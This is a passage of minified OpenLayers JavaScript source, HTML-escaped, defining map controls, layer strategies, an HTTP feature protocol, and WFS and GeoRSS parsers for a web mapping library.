Math.sqrt(Math.pow(b.olClientX-a.olClientX,2)+Math.pow(b.olClientY-a.olClientY,2))},getPinchData:function(a){a=this.getDistance(a.touches);return{distance:a,delta:this.last.distance-a,scale:a/this.start.distance}},CLASS_NAME:"OpenLayers.Handler.Pinch"});OpenLayers.Control.NavToolbar=OpenLayers.Class(OpenLayers.Control.Panel,{initialize:function(a){OpenLayers.Control.Panel.prototype.initialize.apply(this,[a]);this.addControls([new OpenLayers.Control.Navigation,new OpenLayers.Control.ZoomBox])},draw:function(){var a=OpenLayers.Control.Panel.prototype.draw.apply(this,arguments);null===this.defaultControl&amp;&amp;(this.defaultControl=this.controls[0]);return a},CLASS_NAME:"OpenLayers.Control.NavToolbar"});OpenLayers.Strategy.Refresh=OpenLayers.Class(OpenLayers.Strategy,{force:!1,interval:0,timer:null,activate:function(){var a=OpenLayers.Strategy.prototype.activate.call(this);a&amp;&amp;(!0===this.layer.visibility&amp;&amp;this.start(),this.layer.events.on({visibilitychanged:this.reset,scope:this}));return a},deactivate:function(){var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&amp;&amp;(this.stop(),this.layer.events.un({visibilitychanged:this.reset,scope:this}));return a},reset:function(){!0===this.layer.visibility? this.start():this.stop()},start:function(){this.interval&amp;&amp;("number"===typeof this.interval&amp;&amp;0&lt;this.interval)&amp;&amp;(this.timer=window.setInterval(OpenLayers.Function.bind(this.refresh,this),this.interval))},refresh:function(){this.layer&amp;&amp;(this.layer.refresh&amp;&amp;"function"==typeof this.layer.refresh)&amp;&amp;this.layer.refresh({force:this.force})},stop:function(){null!==this.timer&amp;&amp;(window.clearInterval(this.timer),this.timer=null)},CLASS_NAME:"OpenLayers.Strategy.Refresh"});OpenLayers.Layer.ArcGIS93Rest=OpenLayers.Class(OpenLayers.Layer.Grid,{DEFAULT_PARAMS:{format:"png"},isBaseLayer:!0,initialize:function(a,b,c,d){var e=[];c=OpenLayers.Util.upperCaseObject(c);e.push(a,b,c,d);OpenLayers.Layer.Grid.prototype.initialize.apply(this,e);OpenLayers.Util.applyDefaults(this.params,OpenLayers.Util.upperCaseObject(this.DEFAULT_PARAMS));this.params.TRANSPARENT&amp;&amp;"true"==this.params.TRANSPARENT.toString().toLowerCase()&amp;&amp;(null!=d&amp;&amp;d.isBaseLayer||(this.isBaseLayer=!1),"jpg"==this.params.FORMAT&amp;&amp; (this.params.FORMAT=OpenLayers.Util.alphaHack()?"gif":"png"))},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.ArcGIS93Rest(this.name,this.url,this.params,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},getURL:function(a){a=this.adjustBounds(a);var b=this.projection.getCode().split(":"),b=b[b.length-1],c=this.getImageSize();a={BBOX:a.toBBOX(),SIZE:c.w+","+c.h,F:"image",BBOXSR:b,IMAGESR:b};if(this.layerDefs){var b=[],d;for(d in this.layerDefs)this.layerDefs.hasOwnProperty(d)&amp;&amp; this.layerDefs[d]&amp;&amp;(b.push(d),b.push(":"),b.push(this.layerDefs[d]),b.push(";"));0&lt;b.length&amp;&amp;(a.LAYERDEFS=b.join(""))}return this.getFullRequestString(a)},setLayerFilter:function(a,b){this.layerDefs||(this.layerDefs={});b?this.layerDefs[a]=b:delete this.layerDefs[a]},clearLayerFilter:function(a){a?delete this.layerDefs[a]:delete this.layerDefs},mergeNewParams:function(a){a=[OpenLayers.Util.upperCaseObject(a)];return OpenLayers.Layer.Grid.prototype.mergeNewParams.apply(this,a)},CLASS_NAME:"OpenLayers.Layer.ArcGIS93Rest"});OpenLayers.Handler.Hover=OpenLayers.Class(OpenLayers.Handler,{delay:500,pixelTolerance:null,stopMove:!1,px:null,timerId:null,mousemove:function(a){this.passesTolerance(a.xy)&amp;&amp;(this.clearTimer(),this.callback("move",[a]),this.px=a.xy,a=OpenLayers.Util.extend({},a),this.timerId=window.setTimeout(OpenLayers.Function.bind(this.delayedCall,this,a),this.delay));return!this.stopMove},mouseout:function(a){OpenLayers.Util.mouseLeft(a,this.map.viewPortDiv)&amp;&amp;(this.clearTimer(),this.callback("move",[a]));return!0}, passesTolerance:function(a){var b=!0;this.pixelTolerance&amp;&amp;this.px&amp;&amp;Math.sqrt(Math.pow(this.px.x-a.x,2)+Math.pow(this.px.y-a.y,2))&lt;this.pixelTolerance&amp;&amp;(b=!1);return b},clearTimer:function(){null!=this.timerId&amp;&amp;(window.clearTimeout(this.timerId),this.timerId=null)},delayedCall:function(a){this.callback("pause",[a])},deactivate:function(){var a=!1;OpenLayers.Handler.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.clearTimer(),a=!0);return a},CLASS_NAME:"OpenLayers.Handler.Hover"});OpenLayers.Control.GetFeature=OpenLayers.Class(OpenLayers.Control,{protocol:null,multipleKey:null,toggleKey:null,modifiers:null,multiple:!1,click:!0,single:!0,clickout:!0,toggle:!1,clickTolerance:5,hover:!1,box:!1,maxFeatures:10,features:null,hoverFeature:null,handlers:null,hoverResponse:null,filterType:OpenLayers.Filter.Spatial.BBOX,initialize:function(a){a.handlerOptions=a.handlerOptions||{};OpenLayers.Control.prototype.initialize.apply(this,[a]);this.features={};this.handlers={};this.click&amp;&amp;(this.handlers.click= new OpenLayers.Handler.Click(this,{click:this.selectClick},this.handlerOptions.click||{}));this.box&amp;&amp;(this.handlers.box=new OpenLayers.Handler.Box(this,{done:this.selectBox},OpenLayers.Util.extend(this.handlerOptions.box,{boxDivClassName:"olHandlerBoxSelectFeature"})));this.hover&amp;&amp;(this.handlers.hover=new OpenLayers.Handler.Hover(this,{move:this.cancelHover,pause:this.selectHover},OpenLayers.Util.extend(this.handlerOptions.hover,{delay:250,pixelTolerance:2})))},activate:function(){if(!this.active)for(var a in this.handlers)this.handlers[a].activate(); return OpenLayers.Control.prototype.activate.apply(this,arguments)},deactivate:function(){if(this.active)for(var a in this.handlers)this.handlers[a].deactivate();return OpenLayers.Control.prototype.deactivate.apply(this,arguments)},selectClick:function(a){var b=this.pixelToBounds(a.xy);this.setModifiers(a);this.request(b,{single:this.single})},selectBox:function(a){var b;if(a instanceof OpenLayers.Bounds)b=this.map.getLonLatFromPixel({x:a.left,y:a.bottom}),a=this.map.getLonLatFromPixel({x:a.right, y:a.top}),b=new OpenLayers.Bounds(b.lon,b.lat,a.lon,a.lat);else{if(this.click)return;b=this.pixelToBounds(a)}this.setModifiers(this.handlers.box.dragHandler.evt);this.request(b)},selectHover:function(a){a=this.pixelToBounds(a.xy);this.request(a,{single:!0,hover:!0})},cancelHover:function(){this.hoverResponse&amp;&amp;(this.protocol.abort(this.hoverResponse),this.hoverResponse=null,OpenLayers.Element.removeClass(this.map.viewPortDiv,"olCursorWait"))},request:function(a,b){b=b||{};var c=new OpenLayers.Filter.Spatial({type:this.filterType, value:a});OpenLayers.Element.addClass(this.map.viewPortDiv,"olCursorWait");c=this.protocol.read({maxFeatures:!0==b.single?this.maxFeatures:void 0,filter:c,callback:function(c){c.success()&amp;&amp;(c.features.length?!0==b.single?this.selectBestFeature(c.features,a.getCenterLonLat(),b):this.select(c.features):b.hover?this.hoverSelect():(this.events.triggerEvent("clickout"),this.clickout&amp;&amp;this.unselectAll()));OpenLayers.Element.removeClass(this.map.viewPortDiv,"olCursorWait")},scope:this});!0==b.hover&amp;&amp;(this.hoverResponse= c)},selectBestFeature:function(a,b,c){c=c||{};if(a.length){b=new OpenLayers.Geometry.Point(b.lon,b.lat);for(var d,e,f,g=Number.MAX_VALUE,h=0;h&lt;a.length&amp;&amp;!(d=a[h],d.geometry&amp;&amp;(f=b.distanceTo(d.geometry,{edge:!1}),f&lt;g&amp;&amp;(g=f,e=d,0==g)));++h);!0==c.hover?this.hoverSelect(e):this.select(e||a)}},setModifiers:function(a){this.modifiers={multiple:this.multiple||this.multipleKey&amp;&amp;a[this.multipleKey],toggle:this.toggle||this.toggleKey&amp;&amp;a[this.toggleKey]}},select:function(a){this.modifiers.multiple||this.modifiers.toggle|| this.unselectAll();OpenLayers.Util.isArray(a)||(a=[a]);var b=this.events.triggerEvent("beforefeaturesselected",{features:a});if(!1!==b){for(var c=[],d,e=0,f=a.length;e&lt;f;++e)d=a[e],this.features[d.fid||d.id]?this.modifiers.toggle&amp;&amp;this.unselect(this.features[d.fid||d.id]):(b=this.events.triggerEvent("beforefeatureselected",{feature:d}),!1!==b&amp;&amp;(this.features[d.fid||d.id]=d,c.push(d),this.events.triggerEvent("featureselected",{feature:d})));this.events.triggerEvent("featuresselected",{features:c})}}, hoverSelect:function(a){var b=a?a.fid||a.id:null,c=this.hoverFeature?this.hoverFeature.fid||this.hoverFeature.id:null;c&amp;&amp;c!=b&amp;&amp;(this.events.triggerEvent("outfeature",{feature:this.hoverFeature}),this.hoverFeature=null);b&amp;&amp;b!=c&amp;&amp;(this.events.triggerEvent("hoverfeature",{feature:a}),this.hoverFeature=a)},unselect:function(a){delete this.features[a.fid||a.id];this.events.triggerEvent("featureunselected",{feature:a})},unselectAll:function(){for(var a in this.features)this.unselect(this.features[a])}, setMap:function(a){for(var b in this.handlers)this.handlers[b].setMap(a);OpenLayers.Control.prototype.setMap.apply(this,arguments)},pixelToBounds:function(a){var b=a.add(-this.clickTolerance/2,this.clickTolerance/2);a=a.add(this.clickTolerance/2,-this.clickTolerance/2);b=this.map.getLonLatFromPixel(b);a=this.map.getLonLatFromPixel(a);return new OpenLayers.Bounds(b.lon,b.lat,a.lon,a.lat)},CLASS_NAME:"OpenLayers.Control.GetFeature"});OpenLayers.Format.QueryStringFilter=function(){function a(a){a=a.replace(/%/g,"\\%");a=a.replace(/\\\\\.(\*)?/g,function(a,b){return b?a:"\\\\_"});a=a.replace(/\\\\\.\*/g,"\\\\%");a=a.replace(/(\\)?\.(\*)?/g,function(a,b,c){return b||c?a:"_"});a=a.replace(/(\\)?\.\*/g,function(a,b){return b?a:"%"});a=a.replace(/\\\./g,".");return a=a.replace(/(\\)?\\\*/g,function(a,b){return b?a:"*"})}var b={};b[OpenLayers.Filter.Comparison.EQUAL_TO]="eq";b[OpenLayers.Filter.Comparison.NOT_EQUAL_TO]="ne";b[OpenLayers.Filter.Comparison.LESS_THAN]= "lt";b[OpenLayers.Filter.Comparison.LESS_THAN_OR_EQUAL_TO]="lte";b[OpenLayers.Filter.Comparison.GREATER_THAN]="gt";b[OpenLayers.Filter.Comparison.GREATER_THAN_OR_EQUAL_TO]="gte";b[OpenLayers.Filter.Comparison.LIKE]="ilike";return OpenLayers.Class(OpenLayers.Format,{wildcarded:!1,srsInBBOX:!1,write:function(c,d){d=d||{};var e=c.CLASS_NAME,e=e.substring(e.lastIndexOf(".")+1);switch(e){case "Spatial":switch(c.type){case OpenLayers.Filter.Spatial.BBOX:d.bbox=c.value.toArray();this.srsInBBOX&amp;&amp;c.projection&amp;&amp; d.bbox.push(c.projection.getCode());break;case OpenLayers.Filter.Spatial.DWITHIN:d.tolerance=c.distance;case OpenLayers.Filter.Spatial.WITHIN:d.lon=c.value.x;d.lat=c.value.y;break;default:OpenLayers.Console.warn("Unknown spatial filter type "+c.type)}break;case "Comparison":e=b[c.type];if(void 0!==e){var f=c.value;c.type==OpenLayers.Filter.Comparison.LIKE&amp;&amp;(f=a(f),this.wildcarded&amp;&amp;(f="%"+f+"%"));d[c.property+"__"+e]=f;d.queryable=d.queryable||[];d.queryable.push(c.property)}else OpenLayers.Console.warn("Unknown comparison filter type "+ c.type);break;case "Logical":if(c.type===OpenLayers.Filter.Logical.AND)for(e=0,f=c.filters.length;e&lt;f;e++)d=this.write(c.filters[e],d);else OpenLayers.Console.warn("Unsupported logical filter type "+c.type);break;default:OpenLayers.Console.warn("Unknown filter type "+e)}return d},CLASS_NAME:"OpenLayers.Format.QueryStringFilter"})}();OpenLayers.Control.MousePosition=OpenLayers.Class(OpenLayers.Control,{autoActivate:!0,element:null,prefix:"",separator:", ",suffix:"",numDigits:5,granularity:10,emptyString:null,lastXy:null,displayProjection:null,destroy:function(){this.deactivate();OpenLayers.Control.prototype.destroy.apply(this,arguments)},activate:function(){return OpenLayers.Control.prototype.activate.apply(this,arguments)?(this.map.events.register("mousemove",this,this.redraw),this.map.events.register("mouseout",this,this.reset), this.redraw(),!0):!1},deactivate:function(){return OpenLayers.Control.prototype.deactivate.apply(this,arguments)?(this.map.events.unregister("mousemove",this,this.redraw),this.map.events.unregister("mouseout",this,this.reset),this.element.innerHTML="",!0):!1},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);this.element||(this.div.left="",this.div.top="",this.element=this.div);return this.div},redraw:function(a){var b;if(null==a)this.reset();else if(null==this.lastXy||Math.abs(a.xy.x- this.lastXy.x)>this.granularity||Math.abs(a.xy.y-this.lastXy.y)>this.granularity)this.lastXy=a.xy;else if(b=this.map.getLonLatFromPixel(a.xy))this.displayProjection&amp;&amp;b.transform(this.map.getProjectionObject(),this.displayProjection),this.lastXy=a.xy,a=this.formatOutput(b),a!=this.element.innerHTML&amp;&amp;(this.element.innerHTML=a)},reset:function(a){null!=this.emptyString&amp;&amp;(this.element.innerHTML=this.emptyString)},formatOutput:function(a){var b=parseInt(this.numDigits);return this.prefix+a.lon.toFixed(b)+ this.separator+a.lat.toFixed(b)+this.suffix},CLASS_NAME:"OpenLayers.Control.MousePosition"});OpenLayers.Control.Geolocate=OpenLayers.Class(OpenLayers.Control,{geolocation:null,available:"geolocation"in navigator,bind:!0,watch:!1,geolocationOptions:null,destroy:function(){this.deactivate();OpenLayers.Control.prototype.destroy.apply(this,arguments)},activate:function(){this.available&amp;&amp;!this.geolocation&amp;&amp;(this.geolocation=navigator.geolocation);return this.geolocation?OpenLayers.Control.prototype.activate.apply(this,arguments)?(this.watch?this.watchId=this.geolocation.watchPosition(OpenLayers.Function.bind(this.geolocate, this),OpenLayers.Function.bind(this.failure,this),this.geolocationOptions):this.getCurrentLocation(),!0):!1:(this.events.triggerEvent("locationuncapable"),!1)},deactivate:function(){this.active&amp;&amp;null!==this.watchId&amp;&amp;this.geolocation.clearWatch(this.watchId);return OpenLayers.Control.prototype.deactivate.apply(this,arguments)},geolocate:function(a){var b=(new OpenLayers.LonLat(a.coords.longitude,a.coords.latitude)).transform(new OpenLayers.Projection("EPSG:4326"),this.map.getProjectionObject());this.bind&amp;&amp; this.map.setCenter(b);this.events.triggerEvent("locationupdated",{position:a,point:new OpenLayers.Geometry.Point(b.lon,b.lat)})},getCurrentLocation:function(){if(!this.active||this.watch)return!1;this.geolocation.getCurrentPosition(OpenLayers.Function.bind(this.geolocate,this),OpenLayers.Function.bind(this.failure,this),this.geolocationOptions);return!0},failure:function(a){this.events.triggerEvent("locationfailed",{error:a})},CLASS_NAME:"OpenLayers.Control.Geolocate"});OpenLayers.Tile.UTFGrid=OpenLayers.Class(OpenLayers.Tile,{url:null,utfgridResolution:2,json:null,format:null,destroy:function(){this.clear();OpenLayers.Tile.prototype.destroy.apply(this,arguments)},draw:function(){var a=OpenLayers.Tile.prototype.draw.apply(this,arguments);if(a)if(this.isLoading?(this.abortLoading(),this.events.triggerEvent("reload")):(this.isLoading=!0,this.events.triggerEvent("loadstart")),this.url=this.layer.getURL(this.bounds),this.layer.useJSONP){var b=new OpenLayers.Protocol.Script({url:this.url, callback:function(a){this.isLoading=!1;this.events.triggerEvent("loadend");this.json=a.data},scope:this});b.read();this.request=b}else this.request=OpenLayers.Request.GET({url:this.url,callback:function(a){this.isLoading=!1;this.events.triggerEvent("loadend");200===a.status&amp;&amp;this.parseData(a.responseText)},scope:this});else this.unload();return a},abortLoading:function(){this.request&amp;&amp;(this.request.abort(),delete this.request);this.isLoading=!1},getFeatureInfo:function(a,b){var c=null;if(this.json){var d= this.getFeatureId(a,b);null!==d&amp;&amp;(c={id:d,data:this.json.data[d]})}return c},getFeatureId:function(a,b){var c=null;if(this.json){var d=this.utfgridResolution,d=this.json.grid[Math.floor(b/d)].charCodeAt(Math.floor(a/d)),d=this.indexFromCharCode(d),e=this.json.keys;!isNaN(d)&amp;&amp;d in e&amp;&amp;(c=e[d])}return c},indexFromCharCode:function(a){93&lt;=a&amp;&amp;a--;35&lt;=a&amp;&amp;a--;return a-32},parseData:function(a){this.format||(this.format=new OpenLayers.Format.JSON);this.json=this.format.read(a)},clear:function(){this.json= null},CLASS_NAME:"OpenLayers.Tile.UTFGrid"});OpenLayers.Protocol.HTTP=OpenLayers.Class(OpenLayers.Protocol,{url:null,headers:null,params:null,callback:null,scope:null,readWithPOST:!1,updateWithPOST:!1,deleteWithPOST:!1,wildcarded:!1,srsInBBOX:!1,initialize:function(a){a=a||{};this.params={};this.headers={};OpenLayers.Protocol.prototype.initialize.apply(this,arguments);if(!this.filterToParams&amp;&amp;OpenLayers.Format.QueryStringFilter){var b=new OpenLayers.Format.QueryStringFilter({wildcarded:this.wildcarded,srsInBBOX:this.srsInBBOX});this.filterToParams= function(a,d){return b.write(a,d)}}},destroy:function(){this.headers=this.params=null;OpenLayers.Protocol.prototype.destroy.apply(this)},read:function(a){OpenLayers.Protocol.prototype.read.apply(this,arguments);a=a||{};a.params=OpenLayers.Util.applyDefaults(a.params,this.options.params);a=OpenLayers.Util.applyDefaults(a,this.options);a.filter&amp;&amp;this.filterToParams&amp;&amp;(a.params=this.filterToParams(a.filter,a.params));var b=void 0!==a.readWithPOST?a.readWithPOST:this.readWithPOST,c=new OpenLayers.Protocol.Response({requestType:"read"}); b?(b=a.headers||{},b["Content-Type"]="application/x-www-form-urlencoded",c.priv=OpenLayers.Request.POST({url:a.url,callback:this.createCallback(this.handleRead,c,a),data:OpenLayers.Util.getParameterString(a.params),headers:b})):c.priv=OpenLayers.Request.GET({url:a.url,callback:this.createCallback(this.handleRead,c,a),params:a.params,headers:a.headers});return c},handleRead:function(a,b){this.handleResponse(a,b)},create:function(a,b){b=OpenLayers.Util.applyDefaults(b,this.options);var c=new OpenLayers.Protocol.Response({reqFeatures:a, requestType:"create"});c.priv=OpenLayers.Request.POST({url:b.url,callback:this.createCallback(this.handleCreate,c,b),headers:b.headers,data:this.format.write(a)});return c},handleCreate:function(a,b){this.handleResponse(a,b)},update:function(a,b){b=b||{};var c=b.url||a.url||this.options.url+"/"+a.fid;b=OpenLayers.Util.applyDefaults(b,this.options);var d=new OpenLayers.Protocol.Response({reqFeatures:a,requestType:"update"});d.priv=OpenLayers.Request[this.updateWithPOST?"POST":"PUT"]({url:c,callback:this.createCallback(this.handleUpdate, d,b),headers:b.headers,data:this.format.write(a)});return d},handleUpdate:function(a,b){this.handleResponse(a,b)},"delete":function(a,b){b=b||{};var c=b.url||a.url||this.options.url+"/"+a.fid;b=OpenLayers.Util.applyDefaults(b,this.options);var d=new OpenLayers.Protocol.Response({reqFeatures:a,requestType:"delete"}),e=this.deleteWithPOST?"POST":"DELETE",c={url:c,callback:this.createCallback(this.handleDelete,d,b),headers:b.headers};this.deleteWithPOST&amp;&amp;(c.data=this.format.write(a));d.priv=OpenLayers.Request[e](c); return d},handleDelete:function(a,b){this.handleResponse(a,b)},handleResponse:function(a,b){var c=a.priv;b.callback&amp;&amp;(200&lt;=c.status&amp;&amp;300>c.status?("delete"!=a.requestType&amp;&amp;(a.features=this.parseFeatures(c)),a.code=OpenLayers.Protocol.Response.SUCCESS):a.code=OpenLayers.Protocol.Response.FAILURE,b.callback.call(b.scope,a))},parseFeatures:function(a){var b=a.responseXML;b&amp;&amp;b.documentElement||(b=a.responseText);return!b||0>=b.length?null:this.format.read(b)},commit:function(a,b){function c(a){for(var b= a.features?a.features.length:0,c=Array(b),e=0;e&lt;b;++e)c[e]=a.features[e].fid;r.insertIds=c;d.apply(this,[a])}function d(a){this.callUserCallback(a,b);q=q&amp;&amp;a.success();f++;f>=p&amp;&amp;b.callback&amp;&amp;(r.code=q?OpenLayers.Protocol.Response.SUCCESS:OpenLayers.Protocol.Response.FAILURE,b.callback.apply(b.scope,[r]))}b=OpenLayers.Util.applyDefaults(b,this.options);var e=[],f=0,g={};g[OpenLayers.State.INSERT]=[];g[OpenLayers.State.UPDATE]=[];g[OpenLayers.State.DELETE]=[];for(var h,k,l=[],m=0,n=a.length;m&lt;n;++m)if(h= a[m],k=g[h.state])k.push(h),l.push(h);var p=(0&lt;g[OpenLayers.State.INSERT].length?1:0)+g[OpenLayers.State.UPDATE].length+g[OpenLayers.State.DELETE].length,q=!0,r=new OpenLayers.Protocol.Response({reqFeatures:l});h=g[OpenLayers.State.INSERT];0&lt;h.length&amp;&amp;e.push(this.create(h,OpenLayers.Util.applyDefaults({callback:c,scope:this},b.create)));h=g[OpenLayers.State.UPDATE];for(m=h.length-1;0&lt;=m;--m)e.push(this.update(h[m],OpenLayers.Util.applyDefaults({callback:d,scope:this},b.update)));h=g[OpenLayers.State.DELETE]; for(m=h.length-1;0&lt;=m;--m)e.push(this["delete"](h[m],OpenLayers.Util.applyDefaults({callback:d,scope:this},b["delete"])));return e},abort:function(a){a&amp;&amp;a.priv.abort()},callUserCallback:function(a,b){var c=b[a.requestType];c&amp;&amp;c.callback&amp;&amp;c.callback.call(c.scope,a)},CLASS_NAME:"OpenLayers.Protocol.HTTP"});OpenLayers.Strategy.Cluster=OpenLayers.Class(OpenLayers.Strategy,{distance:20,threshold:null,features:null,clusters:null,clustering:!1,resolution:null,activate:function(){var a=OpenLayers.Strategy.prototype.activate.call(this);if(a)this.layer.events.on({beforefeaturesadded:this.cacheFeatures,featuresremoved:this.clearCache,moveend:this.cluster,scope:this});return a},deactivate:function(){var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&amp;&amp;(this.clearCache(),this.layer.events.un({beforefeaturesadded:this.cacheFeatures, featuresremoved:this.clearCache,moveend:this.cluster,scope:this}));return a},cacheFeatures:function(a){var b=!0;this.clustering||(this.clearCache(),this.features=a.features,this.cluster(),b=!1);return b},clearCache:function(){this.clustering||(this.features=null)},cluster:function(a){if((!a||a.zoomChanged)&amp;&amp;this.features&amp;&amp;(a=this.layer.map.getResolution(),a!=this.resolution||!this.clustersExist())){this.resolution=a;a=[];for(var b,c,d,e=0;e&lt;this.features.length;++e)if(b=this.features[e],b.geometry){c= !1;for(var f=a.length-1;0&lt;=f;--f)if(d=a[f],this.shouldCluster(d,b)){this.addToCluster(d,b);c=!0;break}c||a.push(this.createCluster(this.features[e]))}this.clustering=!0;this.layer.removeAllFeatures();this.clustering=!1;if(0&lt;a.length){if(1&lt;this.threshold)for(b=a.slice(),a=[],e=0,d=b.length;e&lt;d;++e)c=b[e],c.attributes.count&lt;this.threshold?Array.prototype.push.apply(a,c.cluster):a.push(c);this.clustering=!0;this.layer.addFeatures(a);this.clustering=!1}this.clusters=a}},clustersExist:function(){var a= !1;if(this.clusters&amp;&amp;0&lt;this.clusters.length&amp;&amp;this.clusters.length==this.layer.features.length)for(var a=!0,b=0;b&lt;this.clusters.length;++b)if(this.clusters[b]!=this.layer.features[b]){a=!1;break}return a},shouldCluster:function(a,b){var c=a.geometry.getBounds().getCenterLonLat(),d=b.geometry.getBounds().getCenterLonLat();return Math.sqrt(Math.pow(c.lon-d.lon,2)+Math.pow(c.lat-d.lat,2))/this.resolution&lt;=this.distance},addToCluster:function(a,b){a.cluster.push(b);a.attributes.count+=1},createCluster:function(a){var b= a.geometry.getBounds().getCenterLonLat(),b=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Point(b.lon,b.lat),{count:1});b.cluster=[a];return b},CLASS_NAME:"OpenLayers.Strategy.Cluster"});OpenLayers.Strategy.Filter=OpenLayers.Class(OpenLayers.Strategy,{filter:null,cache:null,caching:!1,activate:function(){var a=OpenLayers.Strategy.prototype.activate.apply(this,arguments);a&amp;&amp;(this.cache=[],this.layer.events.on({beforefeaturesadded:this.handleAdd,beforefeaturesremoved:this.handleRemove,scope:this}));return a},deactivate:function(){this.cache=null;this.layer&amp;&amp;this.layer.events&amp;&amp;this.layer.events.un({beforefeaturesadded:this.handleAdd,beforefeaturesremoved:this.handleRemove,scope:this}); return OpenLayers.Strategy.prototype.deactivate.apply(this,arguments)},handleAdd:function(a){if(!this.caching&amp;&amp;this.filter){var b=a.features;a.features=[];for(var c,d=0,e=b.length;d&lt;e;++d)c=b[d],this.filter.evaluate(c)?a.features.push(c):this.cache.push(c)}},handleRemove:function(a){this.caching||(this.cache=[])},setFilter:function(a){this.filter=a;a=this.cache;this.cache=[];this.handleAdd({features:this.layer.features});0&lt;this.cache.length&amp;&amp;(this.caching=!0,this.layer.removeFeatures(this.cache.slice()), this.caching=!1);0&lt;a.length&amp;&amp;(a={features:a},this.handleAdd(a),0&lt;a.features.length&amp;&amp;(this.caching=!0,this.layer.addFeatures(a.features),this.caching=!1))},CLASS_NAME:"OpenLayers.Strategy.Filter"});OpenLayers.Protocol.SOS=function(a){a=OpenLayers.Util.applyDefaults(a,OpenLayers.Protocol.SOS.DEFAULTS);var b=OpenLayers.Protocol.SOS["v"+a.version.replace(/\./g,"_")];if(!b)throw"Unsupported SOS version: "+a.version;return new b(a)};OpenLayers.Protocol.SOS.DEFAULTS={version:"1.0.0"};OpenLayers.Format.WFSDescribeFeatureType=OpenLayers.Class(OpenLayers.Format.XML,{regExes:{trimSpace:/^\s*|\s*$/g},namespaces:{xsd:"http://www.w3.org/2001/XMLSchema"},readers:{xsd:{schema:function(a,b){var c=[],d={},e,f;this.readChildNodes(a,{complexTypes:c,customTypes:d});var g=a.attributes,h,k;e=0;for(f=g.length;e&lt;f;++e)h=g[e],k=h.name,0===k.indexOf("xmlns")?this.setNamespace(k.split(":")[1]||"",h.value):b[k]=h.value;b.featureTypes=c;b.targetPrefix=this.namespaceAlias[b.targetNamespace];e=0;for(f= c.length;e&lt;f;++e)g=c[e],h=d[g.typeName],d[g.typeName]&amp;&amp;(g.typeName=h.name)},complexType:function(a,b){var c={typeName:a.getAttribute("name")};this.readChildNodes(a,c);b.complexTypes.push(c)},complexContent:function(a,b){this.readChildNodes(a,b)},extension:function(a,b){this.readChildNodes(a,b)},sequence:function(a,b){var c={elements:[]};this.readChildNodes(a,c);b.properties=c.elements},element:function(a,b){var c;if(b.elements){var d={};c=a.attributes;for(var e,f=0,g=c.length;f&lt;g;++f)e=c[f],d[e.name]= e.value;c=d.type;c||(c={},this.readChildNodes(a,c),d.restriction=c,d.type=c.base);d.localType=(c.base||c).split(":").pop();b.elements.push(d);this.readChildNodes(a,d)}b.complexTypes&amp;&amp;(c=a.getAttribute("type"),d=c.split(":").pop(),b.customTypes[d]={name:a.getAttribute("name"),type:c})},annotation:function(a,b){b.annotation={};this.readChildNodes(a,b.annotation)},appinfo:function(a,b){b.appinfo||(b.appinfo=[]);b.appinfo.push(this.getChildValue(a))},documentation:function(a,b){b.documentation||(b.documentation= []);var c=this.getChildValue(a);b.documentation.push({lang:a.getAttribute("xml:lang"),textContent:c.replace(this.regExes.trimSpace,"")})},simpleType:function(a,b){this.readChildNodes(a,b)},restriction:function(a,b){b.base=a.getAttribute("base");this.readRestriction(a,b)}}},readRestriction:function(a,b){for(var c=a.childNodes,d,e,f=0,g=c.length;f&lt;g;++f)d=c[f],1==d.nodeType&amp;&amp;(e=d.nodeName.split(":").pop(),d=d.getAttribute("value"),b[e]?("string"==typeof b[e]&amp;&amp;(b[e]=[b[e]]),b[e].push(d)):b[e]=d)},read:function(a){"string"== typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={};if("ExceptionReport"===a.nodeName.split(":").pop()){var c=new OpenLayers.Format.OGCExceptionReport;b.error=c.read(a)}else this.readNode(a,b);return b},CLASS_NAME:"OpenLayers.Format.WFSDescribeFeatureType"});OpenLayers.Format.GeoRSS=OpenLayers.Class(OpenLayers.Format.XML,{rssns:"http://backend.userland.com/rss2",featureNS:"http://mapserver.gis.umn.edu/mapserver",georssns:"http://www.georss.org/georss",geons:"http://www.w3.org/2003/01/geo/wgs84_pos#",featureTitle:"Untitled",featureDescription:"No Description",gmlParser:null,xy:!1,createGeometryFromItem:function(a){var b=this.getElementsByTagNameNS(a,this.georssns,"point"),c=this.getElementsByTagNameNS(a,this.geons,"lat"),d=this.getElementsByTagNameNS(a, this.geons,"long"),e=this.getElementsByTagNameNS(a,this.georssns,"line"),f=this.getElementsByTagNameNS(a,this.georssns,"polygon"),g=this.getElementsByTagNameNS(a,this.georssns,"where");a=this.getElementsByTagNameNS(a,this.georssns,"box");if(0&lt;b.length||0&lt;c.length&amp;&amp;0&lt;d.length){0&lt;b.length?(c=OpenLayers.String.trim(b[0].firstChild.nodeValue).split(/\s+/),2!=c.length&amp;&amp;(c=OpenLayers.String.trim(b[0].firstChild.nodeValue).split(/\s*,\s*/))):c=[parseFloat(c[0].firstChild.nodeValue),parseFloat(d[0].firstChild.nodeValue)]; var h=new OpenLayers.Geometry.Point(c[1],c[0])}else if(0&lt;e.length){c=OpenLayers.String.trim(this.getChildValue(e[0])).split(/\s+/);d=[];e=0;for(f=c.length;e&lt;f;e+=2)b=new OpenLayers.Geometry.Point(c[e+1],c[e]),d.push(b);h=new OpenLayers.Geometry.LineString(d)}else if(0&lt;f.length){c=OpenLayers.String.trim(this.getChildValue(f[0])).split(/\s+/);d=[];e=0;for(f=c.length;e&lt;f;e+=2)b=new OpenLayers.Geometry.Point(c[e+1],c[e]),d.push(b);h=new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing(d)])}else 0&lt; g.length?(this.gmlParser||(this.gmlParser=new OpenLayers.Format.GML({xy:this.xy})),h=this.gmlParser.parseFeature(g[0]).geometry):0&lt;a.length&amp;&amp;(c=OpenLayers.String.trim(a[0].firstChild.nodeValue).split(/\s+/),d=[],3&lt;c.length&amp;&amp;(b=new OpenLayers.Geometry.Point(c[1],c[0]),d.push(b),b=new 